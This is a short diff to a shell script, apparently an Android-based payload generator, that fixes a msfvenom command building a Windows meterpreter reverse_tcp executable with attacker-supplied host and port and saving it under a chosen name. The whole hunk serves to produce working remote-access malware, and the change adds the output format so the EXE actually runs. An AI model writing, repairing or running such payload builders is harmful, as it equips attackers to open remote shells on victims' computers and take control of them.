@@ -63,7 +63,7 @@ echo
 echo
 echo "${yellow}${bt}Please Wait... EXE Is Generating...${reset}"
 echo
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R -o /storage/emulated/0/$name.exe
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe R -o /storage/emulated/0/$name.exe
 echo "${pink}${bt}"
 echo " ~ EXE Payload Generated Successfully"
 echo " ~ Payload Saved To /storage/emulated/0/$name"
